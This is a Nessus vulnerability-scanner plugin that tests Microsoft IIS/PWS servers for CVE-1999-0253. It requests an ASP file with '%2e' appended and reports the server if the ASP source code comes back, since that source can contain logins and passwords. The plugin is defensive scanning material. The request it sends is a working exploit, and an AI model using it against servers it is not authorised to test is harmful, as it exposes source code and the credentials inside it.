#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10363);
 script_version ("$Revision: 1.33 $");
 script_cvs_date("$Date: 2015/09/24 20:59:28 $");

 script_cve_id("CVE-1999-0253"); 
 script_bugtraq_id(1814);
 script_osvdb_id(277);

 script_name(english:"Microsoft IIS/PWS %2e Request ASP Source Disclosure");
 script_summary(english:"downloads the source of ASP scripts");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure flaw." );
 script_set_attribute(attribute:"description", value:
"It is possible to get the source code of a remote ASP script by
appending '%2e' to the end of the request.  ASP source code usually
contains sensitive information such as logins and passwords." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/04/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "1997/03/19");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();
 
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2000-2015 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("find_service1.nasl", "webmirror.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/ASP");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, asp:TRUE);

function check(file)
{
  local_var w, r, report;

  w = http_send_recv3(method:"GET",item:string(file, "%2e"), port:port, exit_on_fail:TRUE);

  r = strcat(w[0], w[1], '\r\n', w[2]);
  if ("Content-Type: application/octet-stream" >< r && "<%" >< r)
  {
    if (report_verbosity > 0)
    {
      report = 
        '\n' + "Nessus was able to retrieve the source of '" + file + "' by sending" +
        '\nthe following request :' +
        '\n' +
        '\n  ' + build_url(port:port, qs:file+'%2e') + '\n';

      if (report_verbosity > 1)
      {
        report += 
          '\nHere is the full response :' +
          '\n' +
          '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
          '\n' + r +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    return(1);
  }
  return(0);
}

if(check(file:"/default.asp"))exit(0);
files = get_kb_list(string("www/", port, "/content/extensions/asp"));
if(isnull(files))exit(0);
files = make_list(files);
check(file:files[0]);
